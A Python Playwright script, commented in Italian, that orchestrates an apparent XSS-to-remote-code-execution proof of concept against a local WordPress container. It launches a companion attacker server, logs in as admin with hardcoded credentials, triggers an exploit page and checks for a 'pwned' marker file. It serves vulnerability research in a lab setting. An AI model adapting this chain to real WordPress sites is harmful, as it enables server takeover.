#!/usr/bin/env python3
"""Esegue il PoC end-to-end con Playwright.

1. Fa partire il container WordPress (già up).
2. Avvia exploit-server.py in background.
3. Logga l'admin su WordPress.
4. Apre la pagina exploit e clicca "Avvia exploit".
5. Attende e mostra il risultato.
"""
import subprocess
import sys
import time
from pathlib import Path

import requests
from playwright.sync_api import sync_playwright

WP = "http://127.0.0.1:8080"
ATTACKER = "http://127.0.0.1:9090"
ROOT = Path(__file__).parent


def wait_for_url(url, timeout=60):
    for _ in range(timeout * 2):
        try:
            r = requests.get(url, timeout=2)
            if r.status_code < 500:
                return True
        except Exception:
            pass
        time.sleep(0.5)
    return False


def main():
    # Avvia server attaccante
    server = subprocess.Popen(
        [sys.executable, str(ROOT / "exploit-server.py")],
        cwd=str(ROOT),
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )
    try:
        if not wait_for_url(ATTACKER):
            print("[!] Server attaccante non raggiungibile")
            return 1

        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context(
                viewport={"width": 1400, "height": 900},
            )
            # Logga admin
            page = context.new_page()
            print("[*] Login admin su WordPress...")
            page.goto(f"{WP}/wp-login.php")
            page.fill("input#user_login", "admin")
            page.fill("input#user_pass", "adminpass")
            page.click("input#wp-submit")
            page.wait_for_load_state("networkidle")
            if "/wp-admin" not in page.url:
                print("[!] Login admin fallito")
                return 1
            print("[*] Admin loggato.")

            # Apre la pagina exploit da wp-admin (autenticata, wpApiSettings.nonce disponibile)
            exploit = page
            exploit_url = f"http://127.0.0.1:8080/wp-admin/xss2shell-exploit.php?nocache={time.time()}"
            print(f"[*] Apertura pagina exploit {exploit_url}...")
            exploit.goto(exploit_url)

            popups = []
            def on_page(newpage):
                idx = len(popups)
                popups.append(newpage)
                print(f"[popup {idx}] opened {newpage.url[:120]}")
                newpage.on("console", lambda msg: print(f"[popup {idx} console] {msg.text}"))
                newpage.on("pageerror", lambda err: print(f"[popup {idx} error] {err}"))
                newpage.on("request", lambda req: print(f"[popup {idx} req] {req.method} {req.url[:200]}") if ("rest_route" in req.url or "admin-ajax" in req.url) else None)
                newpage.on("response", lambda resp: print(f"[popup {idx} resp] {resp.status} {resp.url[:200]}") if ("rest_route" in resp.url or "admin-ajax" in resp.url) else None)
            context.on("page", on_page)

            exploit.click("button#start")
            print("[*] Exploit avviato, attendo il popup...")

            # Attendi risultato nel log
            for i in range(60):
                log_text = exploit.locator("pre#log").text_content() or ""
                if "Risposta server" in log_text or "ERRORE" in log_text:
                    break
                time.sleep(1)
            else:
                print("[!] Timeout in attesa del risultato")
                for idx, pp in enumerate(popups):
                    try:
                        html = pp.content()
                        snippet = html[html.find('<div id="login_error"'):html.find('<form id="loginform"')]
                        print(f"\n--- popup {idx} snippet ---\n{snippet[:1200]}")
                    except Exception as e:
                        print(f"popup {idx} errore: {e}")

            print("\n=== LOG EXPLOIT ===")
            print(log_text)
            print("===================\n")

            # Leggi marker RCE
            try:
                marker = requests.get(f"{WP}/xss2shell-pwned.txt", timeout=10)
                print("[*] Marker RCE:", marker.status_code, marker.text[:200])
            except Exception as e:
                print("[!] Marker non raggiungibile:", e)

            browser.close()
    finally:
        server.terminate()
        try:
            server.wait(timeout=5)
        except Exception:
            server.kill()
        server_out, _ = server.communicate()
        if server_out:
            print("\n=== SERVER LOG ===")
            print(server_out)
            print("==================")

    return 0


if __name__ == "__main__":
    sys.exit(main())
